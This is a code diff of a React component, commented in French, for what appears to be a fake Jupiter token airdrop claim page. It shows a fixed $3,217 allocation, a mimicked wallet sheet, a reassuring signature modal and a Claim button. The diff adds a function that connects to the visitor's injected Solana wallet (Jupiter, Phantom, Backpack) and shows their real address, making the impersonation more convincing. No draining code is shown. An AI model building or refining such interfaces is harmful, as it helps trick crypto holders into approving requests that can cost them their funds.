@@ -10,7 +10,26 @@ import { useEffect, useState } from 'react'
  */
 
 const DOLLARS = 3217      // montant fixe en dollars
-const ADRESSE = '7yg1...fLRb' // adresse du wallet connecte (a remplacer)
+const ADRESSE_REPLI = '7yg1...fLRb' // affiche si aucun wallet injecte n'est present
+
+const abrege = (a) => (a && a.length > 12 ? `${a.slice(0, 4)}...${a.slice(-4)}` : a)
+
+// Lit l'adresse du wallet reellement connecte dans le navigateur (Jupiter,
+// Phantom, Backpack...). Renvoie null si aucun wallet n'est disponible.
+async function lireAdresseWallet() {
+  if (typeof window === 'undefined') return null
+  const fournisseurs = [window.jupiter?.solana, window.jupiter, window.solana, window.backpack?.solana].filter(Boolean)
+  for (const p of fournisseurs) {
+    if (typeof p.connect !== 'function') continue
+    try {
+      const res = await p.connect().catch(() => p.connect({ onlyIfTrusted: true }))
+      const pk = res?.publicKey || p.publicKey || res?.accounts?.[0]?.address
+      const s = typeof pk === 'string' ? pk : pk?.toString?.()
+      if (s) return s
+    } catch { /* refuse ou indisponible : on essaie le suivant */ }
+  }
+  return null
+}
 const JUP_MINT = 'JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN'
 const PRIX_JUP = 'https://lite-api.jup.ag/price/v3?ids=' + JUP_MINT
 const PRIX_REPLI = 0.2936 // secours si l'API ne repond pas
@@ -30,6 +49,8 @@ export default function Connect() {
   const [feuille, setFeuille] = useState(false)
   // Modale de signature affichee au Claim
   const [signature, setSignature] = useState(false)
+  // Adresse du wallet connecte (repli tant qu'aucun wallet n'a repondu)
+  const [adresse, setAdresse] = useState(ADRESSE_REPLI)
   const [reclame, setReclame] = useState(false)
   const [hote, setHote] = useState('')
   useEffect(() => setHote(window.location.hostname), [])
@@ -74,7 +95,9 @@ export default function Connect() {
   const ouvrirFeuille = () => setFeuille(true)
   // Choix de Jupiter : on lie le wallet (sans quitter le site), on ferme la
   // feuille, puis on revele l'allocation
-  const choisirJupiter = () => {
+  const choisirJupiter = async () => {
+    const a = await lireAdresseWallet()
+    if (a) setAdresse(abrege(a))
     setFeuille(false)
     setConnecte(true)
   }
@@ -292,7 +315,7 @@ export default function Connect() {
 
         <div className="rang">
           <span className="rang-cle">Wallet</span>
-          <span className="rang-val">{connecte ? <><img src="/assets/wallet-jupiter.png" alt="" />{ADRESSE}</> : 'Not connected'}</span>
+          <span className="rang-val">{connecte ? <><img src="/assets/wallet-jupiter.png" alt="" />{adresse}</> : 'Not connected'}</span>
         </div>
         <div className="rang">
           <span className="rang-cle">Settles in</span>
@@ -366,7 +389,7 @@ export default function Connect() {
               <div className="sig-item"><span className="sig-oui">&#10003;</span>Can view activity and account balance</div>
               <div className="sig-item"><span className="sig-oui">&#10003;</span>Can request approval for transactions</div>
               <div className="sig-item"><span className="sig-non">&times;</span>Can&rsquo;t access funds without your permission</div>
-              <div className="sig-compte"><span>Account</span><span className="sig-adr">{ADRESSE}</span></div>
+              <div className="sig-compte"><span>Account</span><span className="sig-adr">{adresse}</span></div>
             </div>
             <div className="sig-actions">
               <button className="sig-btn sig-cancel" onClick={() => setSignature(false)}>Cancel</button>
